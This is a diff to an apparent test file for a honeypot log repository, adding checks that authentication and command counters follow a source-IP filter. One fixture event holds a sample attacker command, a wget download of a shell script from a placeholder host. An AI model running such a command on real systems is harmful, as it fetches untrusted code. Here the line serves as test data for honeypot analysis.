@@ -301,6 +301,8 @@ async def test_summary_aggregates_the_stored_events(session, record) -> None:
     assert summary["unique_usernames"] == 2
     assert summary["first_event_at"] == "2026-03-01T11:59:00+00:00"
     assert summary["last_event_at"] == "2026-03-05T10:00:00+00:00"
+    assert summary["auth_attempts"] == 1
+    assert summary["commands"] == 1
     assert _count(summary["by_category"], "session") == 1
     assert _count(summary["by_category"], "authentication") == 1
     assert _count(summary["by_category"], "command") == 1
@@ -318,7 +320,45 @@ async def test_summary_of_an_empty_database(session) -> None:
     assert summary["unique_sessions"] == 0
     assert summary["first_event_at"] is None
     assert summary["last_event_at"] is None
+    assert summary["auth_attempts"] == 0
+    assert summary["commands"] == 0
     assert summary["by_category"] == []
+
+
+async def test_the_rf04_counters_follow_the_filters(session, record) -> None:
+    repository = EventRepository(session)
+    await repository.insert_events(
+        [
+            record(
+                eventid="cowrie.login.failed",
+                session="sess-1",
+                src_ip="203.0.113.10",
+                username="root",
+            ),
+            record(
+                eventid="cowrie.command.success",
+                session="sess-2",
+                src_ip="198.51.100.9",
+                username="admin",
+                input="uname -a",
+            ),
+            record(
+                eventid="cowrie.command.success",
+                session="sess-2",
+                src_ip="198.51.100.9",
+                username="admin",
+                input="wget http://example.test/x.sh",
+                timestamp="2026-03-05T10:00:00.000000Z",
+            ),
+        ]
+    )
+    await session.commit()
+
+    summary = await repository.summary(EventFilters(source_ip="198.51.100.9"))
+
+    assert summary["total_events"] == 2
+    assert summary["auth_attempts"] == 0
+    assert summary["commands"] == 2
 
 
 async def test_summary_respects_the_filters(session, record) -> None:
